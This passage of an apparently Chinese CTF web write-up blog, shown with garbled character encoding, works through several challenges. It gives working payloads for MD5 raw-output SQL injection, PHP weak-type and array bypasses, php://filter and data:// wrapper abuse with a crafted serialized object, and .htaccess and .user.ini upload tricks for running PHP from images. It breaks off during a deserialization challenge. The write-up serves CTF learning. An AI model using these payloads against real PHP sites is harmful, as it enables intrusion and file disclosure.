          <a href="#1-MD5å®ç°SQLæ³¨å…¥" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-MD5å®ç°SQLæ³¨å…¥" class="headerlink" title="1.MD5å®ç°SQLæ³¨å…¥"></a>1.MD5å®ç°SQLæ³¨å…¥</h2>
      <p>ç¬¬ä¸€å…³çš„çš„<code>http</code>å¤´éƒ¨æœ‰<code>hint</code></p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> password<span class="operator">=</span>md5($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></div></figure>

<p>å‚æ•°ä¸º<code>true</code>ä»£è¡¨è¿”å›åŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äº<code>SQL</code>è¯­å¥è¢«<code>md5</code>ä¹‹åçš„å­—ç¬¦ç›´æ¥æ§åˆ¶ï¼Œé‚£ä¹ˆå°è¯•æ„é€ å¦‚ä¸‹</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;xxx&#x27;</span> </span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±èƒ½ç»•è¿‡äº†ã€‚</p>
<p>ä¹Ÿå°±æ˜¯æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²<code>str</code>ï¼Œå…¶<code>md5(str)=&#39;or&#39;xxx </code>ï¼Œè€Œ<code>&#39;or&#39; </code>å¯¹åº”çš„16è¿›åˆ¶ä¸º<code>0x276f7227</code>ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²<code>ffifdyop</code>çš„<code>md5</code>å°±æ»¡è¶³è¿™ä¸ªæ¡ä»¶(ä¸çŸ¥é“è¿™ä¹ˆæ¥çš„)ã€‚</p>
<p>PSï¼šé‚£å¦‚æœä»¥åæƒ³æ‰¾ä¸ä¸€æ ·çš„çš„ï¼Œæ˜¯å¦éœ€è¦ç”¨åˆ°<code>md5</code>ç¢°æ’ï¼Ÿ</p>

        <h2 id="2-PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ"   >
          <a href="#2-PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="2.PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ"></a>2.PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ</h2>
      <p>æŸ¥çœ‹æºç ï¼Œæ³¨é‡Šéƒ¨åˆ†æœ‰æç¤º</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªæ²¡å•¥å¥½è¯´çš„ï¼Œæ‰¾ä¸€ä¸‹<code>0exx</code>è¿™ä¸ªç§‘å­¦è®¡æ•°æ³•ï¼Œä»£è¡¨0çš„xxæ¬¡æ–¹ï¼Œè¿˜æ˜¯0ã€‚<code>QNKCDZO</code>å’Œ<code>s214587387a</code></p>

        <h2 id="3-æ•°ç»„ç»•è¿‡"   >
          <a href="#3-æ•°ç»„ç»•è¿‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ•°ç»„ç»•è¿‡" class="headerlink" title="3.æ•°ç»„ç»•è¿‡"></a>3.æ•°ç»„ç»•è¿‡</h2>
      <p>æœ‰æºç </p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>

<p>åˆ©ç”¨<code>PHP</code>çš„<code>md5</code>è®¡ç®—ç‰¹æ€§</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5(array()) = null</span><br><span class="line">sha1(array()) = null    </span><br><span class="line">ereg(pattern,array()) = null vs preg_match(pattern,array) = false</span><br><span class="line">strcmp(array(), &quot;abc&quot;) = null</span><br><span class="line">strpos(array(),&quot;abc&quot;) = null</span><br></pre></td></tr></table></div></figure>

<p><code>POST</code>ä¼ å…¥<code>param1[]=1&amp;param2[]=2</code>å³å¯å¾—åˆ°Flag</p>

        <h1 id="äºŒåã€-ZJCTF-2019-NiZhuanSiWei"   >
          <a href="#äºŒåã€-ZJCTF-2019-NiZhuanSiWei" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒåã€-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="äºŒåã€[ZJCTF 2019]NiZhuanSiWei"></a>äºŒåã€[ZJCTF 2019]NiZhuanSiWei</h1>
      
        <h2 id="ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–"   >
          <a href="#ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–" class="headerlink" title="ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–"></a>ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–</h2>
      <p>ç»™äº†æºç </p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>éœ€è¦è®¾ç½®<code>text</code>ï¼Œä½†æ˜¯ç”¨çš„æ˜¯<code>file_get_contents</code>ï¼Œè¿™ä¸ªéœ€è¦ä¸ºæ–‡ä»¶æµï¼Œå¯ä»¥ä½¿ç”¨<code>data</code>ä¼ªåè®®ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain,welcome%20to%20the%20zjctf</span><br></pre></td></tr></table></div></figure>

<p>ç„¶å<code>file</code>æç¤ºåŒ…å«è¿›<code>useless.php</code>ï¼Œä½¿ç”¨<code>php://filter/</code>ä¼ªåè®®è¿›è¡Œè¯»å–</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></div></figure>

<p><code>base64</code>è§£ç åè·å–åˆ°æºç </p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123; </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°ä¼šè¾“å‡º<code>file</code>æˆå‘˜æŒ‡å‘çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆä¿®æ”¹<code>file</code>ä¸º<code>flag.php</code>ï¼Œè¿›è¡Œåºåˆ—åŒ–ï¼Œå¾—åˆ°</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç»“åˆæ‰€æœ‰çš„ï¼Œæœ€åååºåˆ—åŒ–<code>password</code>å¾—åˆ°æœ€ç»ˆçš„<code>payload</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></div></figure>

<p>åœ¨æºç æ³¨é‡Šä¸­çœ‹åˆ°<code>flag</code></p>

        <h1 id="äºŒåä¸€ã€-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"   >
          <a href="#äºŒåä¸€ã€-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒåä¸€ã€-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="äºŒåä¸€ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>äºŒåä¸€ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1>
      
        <h2 id="ğŸ”º-htaccessåˆ©ç”¨"   >
          <a href="#ğŸ”º-htaccessåˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”º-htaccessåˆ©ç”¨" class="headerlink" title="ğŸ”º.htaccessåˆ©ç”¨"></a>ğŸ”º<code>.htaccess</code>åˆ©ç”¨</h2>
      <p>ä¼ å…¥<code>.htaccess</code>å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></div></figure>

<p>ä½¿å¾—<code>php</code>å¯ä»¥è§£æ<code>test.png</code>ä¸º<code>php</code>ï¼Œä»è€Œæ‰§è¡Œã€‚ä¸è¿‡<code>.htaccess</code>åªèƒ½åœ¨<code>apache</code>æœåŠ¡ä¸­èµ·ä½œç”¨</p>

        <h1 id="äºŒåäºŒã€-SUCTF-2019-CheckIn"   >
          <a href="#äºŒåäºŒã€-SUCTF-2019-CheckIn" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒåäºŒã€-SUCTF-2019-CheckIn" class="headerlink" title="äºŒåäºŒã€[SUCTF 2019]CheckIn"></a>äºŒåäºŒã€[SUCTF 2019]CheckIn</h1>
      
        <h2 id="ğŸ”º-user-iniåˆ©ç”¨"   >
          <a href="#ğŸ”º-user-iniåˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”º-user-iniåˆ©ç”¨" class="headerlink" title="ğŸ”º.user.iniåˆ©ç”¨"></a>ğŸ”º<code>.user.ini</code>åˆ©ç”¨</h2>
      <p>ä¼ å…¥<code>.user.ini</code>å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=origin.png</span><br></pre></td></tr></table></div></figure>

<p>å‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/287193.html" >æµ…æ.htaccesså’Œ.user.iniæ–‡ä»¶ä¸Šä¼  - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>auto_prepend_file</code>è¡¨ç¤º<code>.user.ini</code>å­˜åœ¨çš„å½“å‰ç›®å½•ä¸‹æ‰§è¡Œ<code>php</code>ä»£ç ä¹‹å‰ï¼Œé¢„å…ˆæ–‡ä»¶åŒ…å«è¿›<code>origin.png</code>ï¼Œä»è€Œèƒ½å¤Ÿè¿›è¡Œä½œä¸º<code>php</code>ä»£ç è§£æ</p>

        <h1 id="äºŒåä¸‰ã€-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"   >
          <a href="#äºŒåä¸‰ã€-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒåä¸‰ã€-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="äºŒåä¸‰ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>äºŒåä¸‰ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1>
      
        <h2 id="ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ"   >
          <a href="#ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ" class="headerlink" title="ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ"></a>ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ</h2>
      <p>æ‰“å¼€å¾—åˆ°æºç </p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°æ¡ä»¶å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>GET</code>ä¼ å…¥çš„<code>str</code>ä¸­æ¯ä¸€ä¸ªå­—ç¬¦éƒ½éœ€è¦åœ¨<code>%32~%125</code>ï¼Œå±äºå¯è§å­—ç¬¦ä¸­</li>
<li>å½“<code>op</code>ä¸º<code>&quot;2&quot;</code>æ˜¯ï¼Œæ‰“å°å‡º<code>filename</code></li>
<li><code>filename</code>éœ€è¦ä¸º<code>flag.php</code></li>
</ul>

        <h2 id="æ¡ä»¶ä¸€"   >
          <a href="#æ¡ä»¶ä¸€" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ¡ä»¶ä¸€" class="headerlink" title="æ¡ä»¶ä¸€"></a>æ¡ä»¶ä¸€</h2>
      <p>è¿™ä¸ªä½¿ç”¨<code>php7.1+</code>é’ˆå¯¹æˆå‘˜å±æ€§ä¸æ•æ„Ÿçš„ç‰¹æ€§ï¼Œå³åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å…¶æ­£å¸¸çš„<code>protected</code>æˆå‘˜ä¼šæœ‰<code>\00*\00</code>æ¥ä¿®é¥°ï¼Œä½†æ˜¯è¿™é‡Œä¸å…è®¸ä¼ å…¥<code>\00</code>ï¼Œé‚£å°±ä¸ä¼ å…¥ã€‚è¿™ä¸ª<code>php7.1+</code>çš„ç‰¹æ€§å…è®¸åœ¨æ²¡æœ‰ä¿®é¥°çš„æ—¶å€™ï¼Œä¹Ÿèƒ½è¿›è¡Œè½¬æ¢ï¼Œä¸ç®¡æ˜¯<code>private</code>è¿˜æ˜¯<code>protected</code>ã€‚ä½†æ˜¯<code>php7.1</code>ä»¥ä¸‹åˆ™ä¸è¡Œï¼Œä¼šå°†ç›¸å…³çš„å˜é‡ç½®ä¸º<code>null</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œä»è€Œæ— æ³•åˆ©ç”¨ã€‚</p>
<p>è‡³äºåé¢çš„å¤šå‡ºæ¥çš„å±æ€§æ˜¯æ€ä¹ˆå›äº‹ï¼Œå°±ä¸å¤ªçŸ¥é“äº†ï¼Œä¼°è®¡æ˜¯<code>php</code>åº•å±‚ä»£ç é—®é¢˜</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220726173826850.png" alt="image-20220726173826850"></p>

        <h2 id="æ¡ä»¶äºŒ"   >
          <a href="#æ¡ä»¶äºŒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ¡ä»¶äºŒ" class="headerlink" title="æ¡ä»¶äºŒ"></a>æ¡ä»¶äºŒ</h2>
      <p>å¯ä»¥æ³¨æ„åˆ°ç¬¬ä¸€æ¬¡åœ¨<code>__destruct</code>ä¸­æ¯”è¾ƒ<code>op</code>ç”¨çš„æ˜¯å¼ºæ¯”è¾ƒ<code>===</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></div></figure>

